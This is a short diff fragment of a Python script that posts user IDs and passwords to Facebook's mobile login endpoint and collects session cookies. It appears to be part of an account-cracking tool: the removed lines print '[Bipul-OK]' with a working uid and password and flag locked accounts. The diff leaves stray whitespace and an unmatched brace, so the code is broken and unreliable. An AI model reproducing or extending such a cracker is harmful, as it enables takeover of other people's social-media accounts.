@@ -200,10 +200,10 @@ def hasan(uid,pwx,tl):
             
                 
                
-                if 'LOCK' in res:
-                    return 'LOCK'
-                else:
-                    print(f'  \r\033[1;92m  [Bipul-OK] '+uid+' • '+ps+'\33[0;92m')
+                
+                    
+                
+         
 }
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
